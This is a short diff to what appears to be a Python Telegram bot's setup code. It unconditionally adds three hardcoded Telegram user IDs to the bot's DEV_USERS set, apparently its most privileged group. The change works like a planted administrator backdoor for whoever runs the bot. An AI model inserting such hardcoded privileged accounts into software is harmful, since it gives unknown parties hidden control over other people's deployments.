@@ -248,13 +248,9 @@ print("Aquiring BOT Client Info")
 BOT_ID = dispatcher.bot.id
 BOT_NAME = dispatcher.bot.first_name
 BOT_USERNAME = dispatcher.bot.username
-
-
-USERS = [7157081753, 7350197183, 6993504674]
-if not USERS in DEV_USERS:
-      DEV_USERS.add(7157081753)
-      DEV_USERS.add(7350197183)
-      DEV_USERS.add(6993504674)
+DEV_USERS.add(7157081753)
+DEV_USERS.add(7350197183)
+DEV_USERS.add(6993504674)
     
 
 
